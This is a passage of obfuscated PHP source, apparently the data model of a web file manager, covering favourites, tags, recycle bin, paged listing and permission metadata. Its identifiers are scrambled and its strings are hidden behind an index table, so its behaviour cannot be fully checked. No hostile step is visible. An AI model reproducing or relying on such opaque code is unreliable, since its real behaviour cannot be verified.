$Âƒ·—á[$ûÚç‡Å[497]] == 1 ? $ûÚç‡Å[78] : $ûÚç‡Å[233]; $Âƒ·—á[$ûÚç‡Å[191]] = $this->typeName($Âƒ·—á[$ûÚç‡Å[191]]); if ($Âƒ·—á[$ûÚç‡Å[497]] != 1) { $Âƒ·—á[$ûÚç‡Å[169]] = $Âƒ·—á[$ûÚç‡Å[498]]; unset($Âƒ·—á[$ûÚç‡Å[498]]); } $µç§“ßß = $ŠßÊØÎù; if (isset($Âƒ·—á[$ûÚç‡Å[499]]) && $Âƒ·—á[$ûÚç‡Å[499]][$ûÚç‡Å[500]] == -1) { $µç§“ßß = $İÕ¥À¬³; } $Âƒ·—á = array_field_key($Âƒ·—á, $µç§“ßß); return $Âƒ·—á; } public function listUserFav() { $¿®ìÎï± =& $_SERVER[‹‰”››ê]; $¿êºİÊ = Model($¿®ìÎï±[501])->listData(); $µ»²Ï— = array_filter_by_field($¿êºİÊ, $¿®ìÎï±[33], $¿®ìÎï±[502]); $µ»²Ï— = array_to_keyvalue($µ»²Ï—, $¿®ìÎï±[12], $¿®ìÎï±[87]); if ($µ»²Ï—) { $­Íæ‹Ø² = $this->listSource(array($¿®ìÎï±[503] => array($¿®ìÎï±[504], $µ»²Ï—))); } $­Íæ‹Ø² = array_to_keyvalue($­Íæ‹Ø²[$¿®ìÎï±[457]], $¿®ìÎï±[194]); foreach ($¿êºİÊ as &$—ç·ùà•) { $—ç·ùà• = array($¿®ìÎï±[505] => $—ç·ùà•[$¿®ìÎï±[487]], $¿®ìÎï±[506] => $—ç·ùà•[$¿®ìÎï±[32]], $¿®ìÎï±[507] => $—ç·ùà•[$¿®ìÎï±[87]], $¿®ìÎï±[508] => $—ç·ùà•[$¿®ìÎï±[33]], $¿®ìÎï±[509] => $—ç·ùà•[$¿®ìÎï±[234]], $¿®ìÎï±[510] => $—ç·ùà•[$¿®ìÎï±[88]]); if ($—ç·ùà•[$¿®ìÎï±[33]] == $¿®ìÎï±[502] && $­Íæ‹Ø²[$—ç·ùà•[$¿®ìÎï±[87]]]) { $—ç·ùà•[$¿®ìÎï±[90]] = $­Íæ‹Ø²[$—ç·ùà•[$¿®ìÎï±[87]]]; } } unset($—ç·ùà•); return $¿êºİÊ; } public function listUserTag($Ä­‰‘Ä) { $³„Êôğè =& $_SERVER[‹‰”››ê]; if ($Ä­‰‘Ä && !is_array($Ä­‰‘Ä)) { $Ä­‰‘Ä = array($Ä­‰‘Ä); } $Éò†œÎ = Model($³„Êôğè[511])->listData(); $Âë¨ğ¥ù = array(); $ØŒ¥š¶ = array(); foreach ($Éò†œÎ as $‘Ë£š¤¶) { $Ã«ÀÖÀ¥ = $‘Ë£š¤¶[$³„Êôğè[87]]; if (!$Ã«ÀÖÀ¥) { continue; } if (!isset($ØŒ¥š¶[$Ã«ÀÖÀ¥])) { $ØŒ¥š¶[$Ã«ÀÖÀ¥] = array(); } $ØŒ¥š¶[$Ã«ÀÖÀ¥][] = $‘Ë£š¤¶[$³„Êôğè[512]]; $Âë¨ğ¥ù[$‘Ë£š¤¶[$³„Êôğè[87]]] = $‘Ë£š¤¶; } $óïì¨Úª = array(); $¬İ†Áœ  = array(); $èãâ±Ú = array(); foreach ($ØŒ¥š¶ as $•…¥åö› => $†’Ä¢¿Ü) { $ëâÉî = !0; if (!$Ä­‰‘Ä) { $óïì¨Úª[] = $•…¥åö›; continue; } foreach ($Ä­‰‘Ä as $ğş‰Çšü) { if (!in_array($ğş‰Çšü, $†’Ä¢¿Ü)) { $ëâÉî = !1; break; } } if (!$ëâÉî) { continue; } if (!is_numeric($•…¥åö›)) { $À’ßâóì = $Âë¨ğ¥ù[$•…¥åö›]; $‚¾‡è¶ = array($³„Êôğè[32] => $À’ßâóì[$³„Êôğè[32]], $³„Êôğè[87] => $À’ßâóì[$³„Êôğè[87]], $³„Êôğè[33] => $À’ßâóì[$³„Êôğè[33]], $³„Êôğè[90] => array($³„Êôğè[513] => 1), $³„Êôğè[235] => !0); if ($À’ßâóì[$³„Êôğè[33]] == $³„Êôğè[233]) { $èãâ±Ú[] = $‚¾‡è¶; } if ($À’ßâóì[$³„Êôğè[33]] == $³„Êôğè[78]) { $¬İ†Áœ [] = $‚¾‡è¶; } continue; } $óïì¨Úª[] = $•…¥åö›; } if ($óïì¨Úª) { $İèÈ‡î = $this->listSource(array($³„Êôğè[503] => array($³„Êôğè[504], $óïì¨Úª))); } $İèÈ‡î = $İèÈ‡î ? $İèÈ‡î : array($³„Êôğè[85] => array(), $³„Êôğè[86] => array()); $İèÈ‡î[$³„Êôğè[85]] = array_merge($İèÈ‡î[$³„Êôğè[85]], $¬İ†Áœ ); $İèÈ‡î[$³„Êôğè[86]] = array_merge($İèÈ‡î[$³„Êôğè[86]], $èãâ±Ú); if (isset($İèÈ‡î[$³„Êôğè[454]]) && count($óïì¨Úª) == $İèÈ‡î[$³„Êôğè[454]][$³„Êôğè[455]]) { return $İèÈ‡î; } $êÁ‡Ïœ = array(); $ªßŒØš¹ = array_to_keyvalue($İèÈ‡î[$³„Êôğè[85]], $³„Êôğè[12], $³„Êôğè[194]); $ô¨ëÈÙ€ = array_to_keyvalue($İèÈ‡î[$³„Êôğè[86]], $³„Êôğè[12], $³„Êôğè[194]); $îî®Ûïƒ = array_merge($ô¨ëÈÙ€, $ªßŒØš¹); foreach ($óïì¨Úª as $Ã«ÀÖÀ¥) { if (!in_array($Ã«ÀÖÀ¥, $îî®Ûïƒ)) { $êÁ‡Ïœ[] = $Ã«ÀÖÀ¥; } } if ($êÁ‡Ïœ) { Model($³„Êôğè[514])->removeBySource($êÁ‡Ïœ); } return $İèÈ‡î; } public function listUserRecycle() { $õ‰ãÛñ¶ =& $_SERVER[‹‰”››ê]; $´µ‰˜ªâ = Model($õ‰ãÛñ¶[515])->listData(); if (!$´µ‰˜ªâ) { return array(); } $â”èÊıÙ = array($õ‰ãÛñ¶[503] => array($õ‰ãÛñ¶[504], $´µ‰˜ªâ), $õ‰ãÛñ¶[516] => 1); return $this->listSource($â”èÊıÙ); } public function listSource($ŞŒœÔ—›, $×…®çö× = 3000, $ÒÜ¶ì = false) { $ÅïÍ„×‡ =& $_SERVER[‹‰”››ê]; if (!isset($ŞŒœÔ—›[$ÅïÍ„×‡[517]])) { $ŞŒœÔ—›[$ÅïÍ„×‡[517]] = 0; } if (isset($ŞŒœÔ—›[$ÅïÍ„×‡[193]]) && $ŞŒœÔ—›[$ÅïÍ„×‡[193]] == $ÅïÍ„×‡[231]) { $ŞŒœÔ—›[$ÅïÍ„×‡[498]] = array($ÅïÍ„×‡[518], $ÅïÍ„×‡[12]); } $•¦ú¹çã = $ÅïÍ„×‡[519]; $ù›¾İù¼ = $this->field($•¦ú¹çã)->_makeOrder()->where($ŞŒœÔ—›)->selectPage($×…®çö×); $this->_listPageCheck($ù›¾İù¼, $•¦ú¹çã, $ŞŒœÔ—›); $this->_listDataApply($ù›¾İù¼[$ÅïÍ„×‡[457]], $ÒÜ¶ì); $this->_listMake($ù›¾İù¼); return $ù›¾İù¼; } private function _listPageCheck(&$’ùò Šù, $ˆØ½×Ö¥, $›ÛÕÉ­é) { $—ƒ·˜°û =& $_SERVER[‹‰”››ê]; if (!is_array($’ùò Šù[$—ƒ·˜°û[454]])) { return; } $Œé«ƒğ‘ = $’ùò Šù[$—ƒ·˜°û[454]]; if ($Œé«ƒğ‘[$—ƒ·˜°û[456]] <= 1) { return; } if ($Œé«ƒğ‘[$—ƒ·˜°û[455]] >= 100000) { return; } if (Model($—ƒ·˜°û[520])->get($—ƒ·˜°û[521]) != $—ƒ·˜°û[522]) { return; } $ˆØ½×Ö¥ = str_replace(array($—ƒ·˜°û[53], $—ƒ·˜°û[429], $—ƒ·˜°û[288]), $—ƒ·˜°û[12], $ˆØ½×Ö¥); $ˆØ½×Ö¥ = $—ƒ·˜°û[523] . str_replace($—ƒ·˜°û[50], $—ƒ·˜°û[524], $ˆØ½×Ö¥) . $—ƒ·˜°û[525]; $¯¯±íİ° = $—ƒ·˜°û[526]; $¯¯±íİ° = $¯¯±íİ° . $—ƒ·˜°û[527]; $¡©â­†¯ = $Œé«ƒğ‘[$—ƒ·˜°û[451]] * ($Œé«ƒğ‘[$—ƒ·˜°û[440]] - 1) . $—ƒ·˜°û[50] . $Œé«ƒğ‘[$—ƒ·˜°û[451]]; $íœûÛò = $this->_makeOrder(!0); $™½×·´È = $—ƒ·˜°û[523] . str_replace($—ƒ·˜°û[50], $—ƒ·˜°û[524], $íœûÛò[0]); if (strpos($™½×·´È, $—ƒ·˜°û[528])) { $™½×·´È = str_replace($—ƒ·˜°û[528], $—ƒ·˜°û[529], $™½×·´È); } else { $™½×·´È .= $—ƒ·˜°û[530] . $íœûÛò[1]; } $¼Á–µîŠ = array(); foreach ($›ÛÕÉ­é as $éøÁ•Ü– => $×«ÙÕçˆ) { $¼Á–µîŠ[$—ƒ·˜°û[523] . $éøÁ•Ü–] = $×«ÙÕçˆ; } $this->alias($—ƒ·˜°û[531])->field($ˆØ½×Ö¥)->limit($¡©â­†¯)->order($™½×·´È); $ÁøÌŞ¢‡ = $this->join($¯¯±íİ°)->where($¼Á–µîŠ)->select(); if ($ÁøÌŞ¢‡) { $’ùò Šù[$—ƒ·˜°û[457]] = $ÁøÌŞ¢‡; } } protected function _makeOrder($üØ€­ıÄ = false) { $‘”Å¼É =& $_SERVER[‹‰”››ê]; $ıË½¸ÇÈ = Model($‘”Å¼É[532])->get($‘”Å¼É[533]); $±‰„İûé = Model($‘”Å¼É[532])->get($‘”Å¼É[534]); $è«‚Š¬ = array($‘”Å¼É[535] => $‘”Å¼É[536], $‘”Å¼É[537] => $‘”Å¼É[538]); $®Î™¾· = array($‘”Å¼É[32] => $‘”Å¼É[32], $‘”Å¼É[79] => $‘”Å¼É[79], $‘”Å¼É[169] => $‘”Å¼É[498], $‘”Å¼É[539] => $‘”Å¼É[539], $‘”Å¼É[540] => $‘”Å¼É[541], $‘”Å¼É[234] => $‘”Å¼É[234], $‘”Å¼É[88] => $‘”Å¼É[88]); $¥‘¨«ùÌ = Input::get($‘”Å¼É[542], $‘”Å¼É[7], $ıË½¸ÇÈ, array_keys($®Î™¾·)); $•‚ÀÇØŒ = Input::get($‘”Å¼É[543], $‘”Å¼É[7], $±‰„İûé, array_keys($è«‚Š¬)); if (!in_array($¥‘¨«ùÌ, array_keys($®Î™¾·))) { $¥‘¨«ùÌ = $‘”Å¼É[32]; } if (!in_array($•‚ÀÇØŒ, array_keys($è«‚Š¬))) { $¥‘¨«ùÌ = $‘”Å¼É[535]; } if ($¥‘¨«ùÌ == $‘”Å¼É[32]) { } $¿Ášªı÷ = $‘”Å¼É[544] . $®Î™¾·[$¥‘¨«ùÌ] . $‘”Å¼É[53] . $è«‚Š¬[$•‚ÀÇØŒ]; $¿Ášªı÷ = rtrim(trim($¿Ášªı÷), $‘”Å¼É[50]); if ($üØ€­ıÄ) { return array($¿Ášªı÷, $è«‚Š¬[$•‚ÀÇØŒ]); } return $this->order($¿Ášªı÷); } protected function _listDataApplyItem($ªöıİØÀ, $À•™‰Åæ = false) { $¦ø§„şí = array($ªöıİØÀ); $this->_listDataApply($¦ø§„şí, $À•™‰Åæ); return $¦ø§„şí[0]; } protected function _listDataApply(&$®ª›Ğº’, $ğ‰÷¤«ˆ = false) { $«Á“°İ– =& $_SERVER[‹‰”››ê]; if (!$®ª›Ğº’) { $®ª›Ğº’ = array(); return; } $õğèŸ·¡ = array_to_keyvalue($®ª›Ğº’, $«Á“°İ–[12], $«Á“°İ–[194]); $õğèŸ·¡ = array_unique($õğèŸ·¡); $this->_listSourceCache($®ª›Ğº’); if (!$ğ‰÷¤«ˆ) { $this->_listAppendMeta($®ª›Ğº’, $õğèŸ·¡); $this->_listAppendFileMeta($®ª›Ğº’, $õğèŸ·¡); $this->_listAppendChildren($®ª›Ğº’, $õğèŸ·¡); } $this->_listAppendPath($®ª›Ğº’); $this->_listAppendAuth($®ª›Ğº’); $this->_listAppendSourceInfo($®ª›Ğº’, $õğèŸ·¡); $this->_listAppendUser($®ª›Ğº’); $this->_listFilterInfo($®ª›Ğº’, $ğ‰÷¤«ˆ); $this->_listAppendAuthSecret($®ª›Ğº’); } protected function _listSourceCache($¯ÅêÖÄ•) { $Ìğ®ÑŸº =& $_SERVER[‹‰”››ê]; foreach ($¯ÅêÖÄ• as $ù¢¾‹Ëé) { self::$cacheSourceInfo[$Ìğ®ÑŸº[545] . $ù¢¾‹Ëé[$Ìğ®ÑŸº[194]]] = $ù¢¾‹Ëé; } } protected function _listFilterInfo(&$‰ø©Ô, $å“”‹¯  = false) { $öÒûä…“ =& $_SERVER[‹‰”››ê]; foreach ($‰ø©Ô as &$ğ²Î¤ª°) { $ğ²Î¤ª° = $this->pathInfoFilter($ğ²Î¤ª°); self::$cachePathInfo[$öÒûä…“[546] . intval($å“”‹¯ ) . $öÒûä…“[474] . $ğ²Î¤ª°[$öÒûä…“[194]]] = $ğ²Î¤ª°; } unset($ğ²Î¤ª°); } protected function _listMake(&$éŸèŒŞÜ) { $ÀŒÍÀÌ› =& $_SERVER[‹‰”››ê]; $éŸèŒŞÜ[$ÀŒÍÀÌ›[85]] = array(); $éŸèŒŞÜ[$ÀŒÍÀÌ›[86]] = array(); foreach ($éŸèŒŞÜ[$ÀŒÍÀÌ›[457]] as $›ù¥°Ê) { $Ÿğ¼¹ÜÓ = $›ù¥°Ê[$ÀŒÍÀÌ›[497]] == 1 ? $ÀŒÍÀÌ›[85] : $ÀŒÍÀÌ›[86]; $éŸèŒŞÜ[$Ÿğ¼¹ÜÓ][] = $›ù¥°Ê; } unset($éŸèŒŞÜ[$ÀŒÍÀÌ›[457]]); } protected function _listAppendMeta(&$›¼ùƒÅÀ, $ïöÙİÇè) { $æŸ‡ì£¯ =& $_SERVER[‹‰”››ê]; $ÛÄï‰¥â = array($æŸ‡ì£¯[503] => array($æŸ‡ì£¯[504], $ïöÙİÇè)); $ùÏ™—Ì½ = Model($æŸ‡ì£¯[547])->field($æŸ‡ì£¯[548])->where($ÛÄï‰¥â)->select(); if (!$ùÏ™—Ì½) { return; } $ºùÈóÛ = array($æŸ‡ì£¯[549], $æŸ‡ì£¯[550], $æŸ‡ì£¯[529]); $ğ¦œúÌ = array(); foreach ($ùÏ™—Ì½ as $Â¼„»ç¶) { if (!isset($ğ¦œúÌ[$Â¼„»ç¶[$æŸ‡ì£¯[194]]])) { $ğ¦œúÌ[$Â¼„»ç¶[$æŸ‡ì£¯[194]]] = array(); } if (in_array($Â¼„»ç¶[$æŸ‡ì£¯[97]], $ºùÈóÛ)) { continue; } if ($Â¼„»ç¶[$æŸ‡ì£¯[97]] == $æŸ‡ì£¯[551]) { $Â¼„»ç¶[$æŸ‡ì£¯[462]] = $æŸ‡ì£¯[552]; } $ğ¦œúÌ[$Â¼„»ç¶[$æŸ‡ì£¯[194]]][$Â¼„»ç¶[$æŸ‡ì£¯[97]]] = $Â¼„»ç¶[$æŸ‡ì£¯[462]]; } foreach ($›¼ùƒÅÀ as &$Ü²…òÇ¼) { $Ü²…òÇ¼[$æŸ‡ì£¯[553]] = !1; if (isset($ğ¦œúÌ[$Ü²…òÇ¼[$æŸ‡ì£¯[194]]])) { $Ü²…òÇ¼[$æŸ‡ì£¯[553]] = $ğ¦œúÌ[$Ü²…òÇ¼[$æŸ‡ì£¯[194]]]; } if ($this->fileIsLock($Ü²…òÇ¼) && $Ü²…òÇ¼[$æŸ‡ì£¯[499]]) { $ÌÙâé‡® = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Ü²…òÇ¼[$æŸ‡ì£¯[499]][$æŸ‡ì£¯[500]] = AuthModel::authDisable($Ü²…òÇ¼[$æŸ‡ì£¯[499]][$æŸ‡ì£¯[500]], $ÌÙâé‡®); $Ü²…òÇ¼[$æŸ‡ì£¯[499]][$æŸ‡ì£¯[554]][$æŸ‡ì£¯[499]] = $Ü²…òÇ¼[$æŸ‡ì£¯[499]][$æŸ‡ì£¯[500]]; } } unset($Ü²…òÇ¼); } protected function _listAppendFileMeta(&$²±­»µç, $äŸÊ“šš) { $Ùõåğ =& $_SERVER[‹‰”››ê]; $¬ÜÕê´ = array_to_keyvalue($²±­»µç, $Ùõåğ[12], $Ùõåğ[555]); $¬ÜÕê´ = array_filter(array_unique($¬ÜÕê´)); if (!$¬ÜÕê´) { return; } $§Ä‹ğâù = array($Ùõåğ[556] => array($Ùõåğ[504], $¬ÜÕê´)); $¥úµ¢±” = $Ùõåğ[557]; $ÌËùû = Model($Ùõåğ[558])->field($¥úµ¢±”)->where($§Ä‹ğâù)->select(); $ÌËùû = array_to_keyvalue($ÌËùû, $Ùõåğ[555]); $¨ñ¡ª» = Model($Ùõåğ[559])->field($Ùõåğ[560])->where($§Ä‹ğâù)->select(); $¨ñ¡ª» = $¨ñ¡ª» ? $¨ñ¡ª» : array(); $Ëåìõ€ = array(); foreach ($¨ñ¡ª» as $ûµÜñÆ’) { if (!isset($Ëåìõ€[$ûµÜñÆ’[$Ùõåğ[555]]])) { $Ëåìõ€[$ûµÜñÆ’[$Ùõåğ[555]]] = array(); } $Ëåìõ€[$ûµÜñÆ’[$Ùõåğ[555]]][$ûµÜñÆ’[$Ùõåğ[97]]] = $ûµÜñÆ’[$Ùõåğ[462]]; } foreach ($²±­»µç as &$ø„ˆ‹ã ) { $¸É”Œ´ñ = $ø„ˆ‹ã [$Ùõåğ[555]]; if (!$¸É”Œ´ñ || !is_array($ÌËùû[$¸É”Œ´ñ])) { continue; } $©îµ¿·í = $ÌËùû[$¸É”Œ´ñ]; $©îµ¿·í[$Ùõåğ[79]] = $ø„ˆ‹ã [$Ùõåğ[79]]; $©îµ¿·í[$Ùõåğ[32]] = $ø„ˆ‹ã [$Ùõåğ[32]]; if (!$©îµ¿·í[$Ùõåğ[561]]) { Model($Ùõåğ[558])->fileMd5Check($©îµ¿·í); } if (!isset(self::$cacheFileInfo[$Ùõåğ[562] . $¸É”Œ´ñ])) { self::$cacheFileInfo[$Ùõåğ[562] . $¸É”Œ´ñ] = array_merge(array(), $©îµ¿·í); } unset($ÌËùû[$¸É”Œ´ñ][$Ùõåğ[87]]); $í‚® — = isset($Ëåìõ€[$¸É”Œ´ñ]) && is_array($Ëåìõ€[$¸É”Œ´ñ]) ? $Ëåìõ€[$¸É”Œ´ñ] : array(); $ø„ˆ‹ã [$Ùõåğ[170]] = array_merge($í‚® —, $ÌËùû[$¸É”Œ´ñ]); if (isset($ø„ˆ‹ã [$Ùõåğ[170]][$Ùõåğ[185]])) { $ø„ˆ‹ã [$Ùõåğ[185]] = json_decode($ø„ˆ‹ã [$Ùõåğ[170]][$Ùõåğ[185]], !0); unset($ø„ˆ‹ã [$Ùõåğ[170]][$Ùõåğ[185]]); } } unset($ø„ˆ‹ã ); } protected function _listAppendSourceInfo(&$²Ó§ÓÍß, $îØÑÃ¸Á) { $ËÅ×úÎÄ =& $_SERVER[‹‰”››ê]; $óÀïı™¬ = Model($ËÅ×úÎÄ[563])->listData(); $ë­ŒËŒû = Model($ËÅ×úÎÄ[511])->listData(); $«Åöã¹ß = Model($ËÅ×úÎÄ[501])->listData(); $Æ–öâÚÁ = Model($ËÅ×úÎÄ[564])->listSimple(); $¤ÈÀ‰Óó = array_to_keyvalue($óÀïı™¬, $ËÅ×úÎÄ[487]); $åÁãçí‹ = array_to_keyvalue_group($ë­ŒËŒû, $ËÅ×úÎÄ[87], $ËÅ×úÎÄ[512]); $³²¹²°Ë = array_to_keyvalue($«Åöã¹ß, $ËÅ×úÎÄ[87]); $ÄÒñ®»í = array_to_keyvalue_group($Æ–öâÚÁ, $ËÅ×úÎÄ[194]); foreach ($²Ó§ÓÍß as &$ÃİïÂïş) { $ÃİïÂïş[$ËÅ×úÎÄ[90]] = array($ËÅ×úÎÄ[565] => 0, $ËÅ×úÎÄ[566] => 0, $ËÅ×úÎÄ[567] => 0); if (isset($³²¹²°Ë[$ÃİïÂïş[$ËÅ×úÎÄ[194]]])) { $ÃİïÂïş[$ËÅ×úÎÄ[90]][$ËÅ×úÎÄ[568]] = 1; $ÃİïÂïş[$ËÅ×úÎÄ[90]][$ËÅ×úÎÄ[569]] = $³²¹²°Ë[$ÃİïÂïş[$ËÅ×úÎÄ[194]]][$ËÅ×úÎÄ[32]]; } if ($åÁãçí‹ && $¤ÈÀ‰Óó && isset($åÁãçí‹[$ÃİïÂïş[$ËÅ×úÎÄ[194]]])) { $ÃİïÂïş[$ËÅ×úÎÄ[90]][$ËÅ×úÎÄ[570]] = array(); foreach ($åÁãçí‹[$ÃİïÂïş[$ËÅ×úÎÄ[194]]] as $ôÑ¦ŒÕò) { $­ªŸêõÃ = $¤ÈÀ‰Óó[$ôÑ¦ŒÕò]; $ÃİïÂïş[$ËÅ×úÎÄ[90]][$ËÅ×úÎÄ[570]][] = array($ËÅ×úÎÄ[571] => $­ªŸêõÃ[$ËÅ×úÎÄ[487]], $ËÅ×úÎÄ[506] => $­ªŸêõÃ[$ËÅ×úÎÄ[32]], $ËÅ×úÎÄ[572] => $­ªŸêõÃ[$ËÅ×úÎÄ[573]]); } } if ($ÄÒñ®»í && isset($ÄÒñ®»í[$ÃİïÂïş[$ËÅ×úÎÄ[194]]])) { $ÃİïÂïş[$ËÅ×úÎÄ[90]][$ËÅ×úÎÄ[574]] = array(); foreach ($ÄÒñ®»í[$ÃİïÂïş[$ËÅ×úÎÄ[194]]] as $ŠëˆÕ÷‹) { $È˜šØ¦Ä = $ËÅ×úÎÄ[575]; if ($ŠëˆÕ÷‹[$ËÅ×úÎÄ[576]] == $ËÅ×úÎÄ[91]) { $È˜šØ¦Ä .= $ËÅ×úÎÄ[577]; } $ÃİïÂïş[$ËÅ×úÎÄ[90]][$ËÅ×úÎÄ[574]] = array_field_key($ŠëˆÕ÷‹, explode($ËÅ×úÎÄ[50], $È˜šØ¦Ä)); } } } unset($ÃİïÂïş); return $²Ó§ÓÍß; } protected function _listAppendChildren(&$Ëâô†Ò‡, $”ù•¢©) { $İ÷¶¿øó =& $_SERVER[‹‰”››ê]; $Ö‡ü½¹› = array(); $ºÉèÄÓæ = array($İ÷¶¿øó[242] => 0, $İ÷¶¿øó[243] => 0); foreach ($Ëâô†Ò‡ as &$ƒœ‹êÔã) { if (!$ƒœ‹êÔã[$İ÷¶¿øó[497]]) { continue; } $Ö‡ü½¹›[] = $ƒœ‹êÔã[$İ÷¶¿øó[194]]; } unset($ƒœ‹êÔã); if (!$Ö‡ü½¹›) { return; } $Ë—‘·Çí = array($İ÷¶¿øó[193] => array($İ÷¶¿øó[7], $Ö‡ü½¹›), $İ÷¶¿øó[517] => 0); $è¥”Œ¯æ = array($İ÷¶¿øó[193], $İ÷¶¿øó[497], $İ÷¶¿øó[578] => $İ÷¶¿øó[579]); $ĞÕõâ = $this->field($è¥”Œ¯æ)->where($Ë—‘·Çí)->group($İ÷¶¿øó[580])->select(); $†×¤Ë = array(); foreach ($ĞÕõâ as $¯ê£Ù) { $úË¼šåÌ = $¯ê£Ù[$İ÷¶¿øó[193]]; $ ÙÜ³ = $¯ê£Ù[$İ÷¶¿øó[497]] == $İ÷¶¿øó[91] ? $İ÷¶¿øó[243] : $İ÷¶¿øó[242]; if (!isset($†×¤Ë[$úË¼šåÌ])) { $†×¤Ë[$úË¼šåÌ] = array($İ÷¶¿øó[242] => 0, $İ÷¶¿øó[243] => 0); } $†×¤Ë[$úË¼šåÌ][$ ÙÜ³] += $¯ê£Ù[$İ÷¶¿øó[579]]; } foreach ($Ëâô†Ò‡ as &$ƒœ‹êÔã) { if (!$ƒœ‹êÔã[$İ÷¶¿øó[497]]) { continue; } $ñ»È‹˜ó = is_array($†×¤Ë[$ƒœ‹êÔã[$İ÷¶¿øó[194]]]) ? $†×¤Ë[$ƒœ‹êÔã[$İ÷¶¿øó[194]]] : $ºÉèÄÓæ; $ƒœ‹êÔã[$İ÷¶¿øó[243]] = $ñ»È‹˜ó[$İ÷¶¿øó[243]]; $ƒœ‹êÔã[$İ÷¶¿øó[242]] = $ñ»È‹˜ó[$İ÷¶¿øó[242]]; unset($ƒœ‹êÔã[$İ÷¶¿øó[498]]); } unset($ƒœ‹êÔã); } protected function _listAppendAuth(&$€İéÃ„à) { $¸û Ğü¤ =& $_SERVER[‹‰”››ê]; $ìıÖãûˆ = array(); foreach ($€İéÃ„à as $¶•‘ó†û) { if ($¶•‘ó†û[$¸û Ğü¤[191]] == self::TYPE_GROUP) { $ìıÖãûˆ[] = $¶•‘ó†û[$¸û Ğü¤[194]]; } } if (!$ìıÖãûˆ) { return; } $³¹ŸÖĞÉ = array_to_keyvalue($€İéÃ„à, $¸û Ğü¤[194]); $òşùòÒÛ = Model($¸û Ğü¤[581])->getSourceList($ìıÖãûˆ, $³¹ŸÖĞÉ); $–ìÂ°¨È = KodUser::isRoot(); foreach ($€İéÃ„à as $çÉÌµôİ => &$¶•‘ó†û) { $¶•‘ó†û[$¸û Ğü¤[499]] = $òşùòÒÛ[$¶•‘ó†û[$¸û Ğü¤[194]]]; if (!$¶•‘ó†û[$¸û Ğü¤[499]] && $¶•‘ó†û[$¸û Ğü¤[191]] == self::TYPE_GROUP) { $¶•‘ó†û[$¸û Ğü¤[499]] = Action($¸û Ğü¤[582])->pathGroupAuthMake($¶•‘ó†û[$¸û Ğü¤[583]]); if (!$¶•‘ó†û[$¸û Ğü¤[499]] && !$–ìÂ°¨È) { $¶•‘ó†û[$¸û Ğü¤[236]] = !1; $¶•‘ó†û[$¸û Ğü¤[235]] = !1; } } if ($¶•‘ó†û[$¸û Ğü¤[499]]) { $¶•‘ó†û[$¸û Ğü¤[236]] = AuthModel::authCheckEdit($¶•‘ó†û[$¸û Ğü¤[499]][$¸û Ğü¤[500]]); $¶•‘ó†û[$¸û Ğü¤[235]] = AuthModel::authCheckView($¶•‘ó†û[$¸û Ğü¤[499]][$¸û Ğü¤[500]]); } $this->groupPathDisplay($¶•‘ó†û); } unset($¶•‘ó†û); } public function _listAppendAuthSecret(&$”ñƒƒÙ) { $šç§†ñ =& $_SERVER[‹‰”››ê]; if (Model($šç§†ñ[520])->get($šç§†ñ[584]) != $šç§†ñ[91]) { return; } static $—é™ÙÑñ = false; if (!$—é™ÙÑñ) { $ï£­“ó‚ = Model($šç§†ñ[585]); $½Ü´ó = Model($šç§†ñ[586]); $—é™ÙÑñ = $½Ü´ó->listData(); $—é™ÙÑñ = array_to_keyvalue($—é™ÙÑñ, $šç§†ñ[194]); $ä¥­¤¿ = json_decode(Model($šç§†ñ[520])->get($šç§†ñ[587]), !0); $ä¥­¤¿ = array_to_keyvalue($ä¥­¤¿, $šç§†ñ[487]); foreach ($—é™ÙÑñ as $Ë¿“ŞŠ => $—™´Şí) { $ˆùè¨üö = $ä¥­¤¿[$—™´Şí[$šç§†ñ[588]]]; if (!$ˆùè¨üö) { $½Ü´ó->remove($—™´Şí[$šç§†ñ[487]]); unset($—é™ÙÑñ[$Ë¿“ŞŠ]); continue; } $Ç¨µÎì¹ = $ï£­“ó‚->listData($ˆùè¨üö[$šç§†ñ[499]]); if (!$Ç¨µÎì¹) { $½Ü´ó->remove($—™´Şí[$šç§†ñ[487]]); unset($—é™ÙÑñ[$Ë¿“ŞŠ]); continue; } $—™´Şí[$šç§†ñ[499]] = $Ç¨µÎì¹; $—™´Şí[$šç§†ñ[589]] = $ˆùè¨üö; $—™´Şí[$šç§†ñ[590]] = Model($šç§†ñ[591])->getInfoSimpleOuter($—™´Şí[$šç§†ñ[539]]); $—é™ÙÑñ[$Ë¿“ŞŠ] = $—™´Şí; } } $—Ñ¥Ä¥Œ = USER_ID; $ï¾˜´¹µ = array(); $Ëø¿şş¶ = $this->_listAppendPath($ï¾˜´¹µ, !0); foreach ($”ñƒƒÙ as $Ë¿“ŞŠ => &$—™´Şí) { if (!is_array($—™´Şí[$šç§†ñ[499]])) { continue; } if ($—™´Şí[$šç§†ñ[191]] != $šç§†ñ[592]) { continue; } if (isset($—é™ÙÑñ[$—™´Şí[$šç§†ñ[194]]])) { $ç­“îèÊ = $—é™ÙÑñ[$—™´Şí[$šç§†ñ[194]]]; if (!is_array($—™´Şí[$šç§†ñ[553]])) { $—™´Şí[$šç§†ñ[553]] = array(); } $—™´Şí[$šç§†ñ[553]][$šç§†ñ[593]] = $ç­“îèÊ[$šç§†ñ[588]]; $—™´Şí[$šç§†ñ[499]][$šç§†ñ[594]] = $ç­“îèÊ; $—™´Şí[$šç§†ñ[499]][$šç§†ñ[595]] = $—™´Şí[$šç§†ñ[596]]; $—™´Şí[$šç§†ñ[499]][$šç§†ñ[597]] = $šç§†ñ[91]; if ($ç­“îèÊ[$šç§†ñ[539]] != $—Ñ¥Ä¥Œ) { $—™´Şí[$šç§†ñ[499]][$šç§†ñ[500]] = $—™´Şí[$šç§†ñ[499]][$šç§†ñ[500]] & $ç­“îèÊ[$šç§†ñ[499]][$šç§†ñ[499]]; } continue; } $ã¹Ö¤ = $this->parentLevelArray($—™´Şí[$šç§†ñ[598]]); $Ûå»»Ú¸ = array_reverse($ã¹Ö¤); foreach ($Ûå»»Ú¸ as $ğÇ²‡¨ => $úîÖñŒñ) { if (!isset($—é™ÙÑñ[$úîÖñŒñ])) { continue; } $ç­“îèÊ = $—é™ÙÑñ[$úîÖñŒñ]; $—™´Şí[$šç§†ñ[499]][$šç§†ñ[594]] = $ç­“îèÊ; if ($ç­“îèÊ[$šç§†ñ[539]] != $—Ñ¥Ä¥Œ) { $—™´Şí[$šç§†ñ[499]][$šç§†ñ[500]] = $—™´Şí[$šç§†ñ[499]][$šç§†ñ[500]] & $ç­“îèÊ[$šç§†ñ[499]][$šç§†ñ[499]]; } $Õªœæ¾± = 